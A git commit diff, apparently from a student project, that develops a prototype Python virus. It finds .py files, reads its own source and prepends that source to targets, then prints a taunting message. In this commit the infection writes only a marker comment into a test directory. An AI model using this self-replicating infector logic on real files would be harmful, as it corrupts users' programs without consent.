e88af01f482c97b272baf7bd362514e0b0f2b983
Petteri Jekunen <petteri.jekunen@tuni.fi>
2022-08-25 18:39:38 +0300

    Added basic infection functionality

--- README.md
+++ README.md
@@ -3,20 +3,24 @@
 Example of how to write a prototype of a virus with Python.
 Based on this: https://thepythoncorner.com/posts/2021-08-30-how-to-create-virus-python
 
+The virus causes any program it is infected by to print out an annoying unwanted message. Moreover the files infected are capable of spreading the virus by infecting any intact files with the same functionality.
+
 ## Requirements
 
-Basic virus character: The virus is capable of infecting other files that will act as desired and will become capable of spreading virus further where ever they will enter.
-
-Virus main functionality: print out annoying message.
-
 When the virus is launched, it will
-1. Search for all the python programs in certain directory of the system
-2. Infect the files by cloning itself into the files found
+1. Print out the message to the screen
+2. Search for all the python programs in certain directory of the system
+3. Infect the intact files by cloning itself into the files found
 
 ## Versions
 
 ### 1.0
 
 Skeleton for the program with stub functions. 
-Hello Virus functionality.
+Hello World only.
 
+### 2.0
+
+Finds file in given directory (./test for development).
+Reads the source code from the current file - not used at this point.
+Infects files in given directory by adding comment.
--- first.py
+++ first.py
@@ -1,32 +1,61 @@
+# ============================================================
 # Virus prototype in Python
+# ============================================================
+
+# --------------------------------------------------------------
+# Functions/methods part of the code
+
+import glob
+
+def get_content_of_file(file):
+    data = None
+    with open(file, "r") as my_file:
+        data = my_file.readlines()
+
+    return data
 
 def get_virus_code():
-    pass
+    # Read the content of this or any infected file. 
+    # It must be pruned later to get only the virus code for infection.
+    code = get_content_of_file(__file__)
+    return code
 
-def find_files_to_infect():
-    return ("")
+def find_files_to_infect(directory = "./"):
+    filelist = []
+    for file in glob.glob(directory + "*.py"):
+        filelist.append(file)
+        # print ("File found: ", file)
+    return filelist
 
 def summon_chaos():
-    pass
+     # the virus payload
+    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")
 
-def infect():
-    pass
+def infect(file, virus_code):    
+    data=get_content_of_file(file)
+    with open(file, "w") as infected_file:
+        # print ("Infecting file: ", file)
+        infected_file.write("".join(virus_code))
+        infected_file.writelines(data)        
 
-print ("Hello Virus!")
+# --------------------------------------------------------------
+# Here starts the execution
 
 try:
      # retrieve the virus code from the current infected script
      virus_code = get_virus_code() 
  
      # look for other files to infect
-     for file in find_files_to_infect():
-         infect(file, virus_code)
- 
+     for file in find_files_to_infect("test/"):
+         #infect(file, virus_code)
+         infect(file, "# --- Virus was here ---\n")
+     
      # call the payload
      summon_chaos()
 
-except:
-    pass
+# Better leave this in comments during development:
+# except:
+#   pass
 
 finally:
     # delete used names from memory
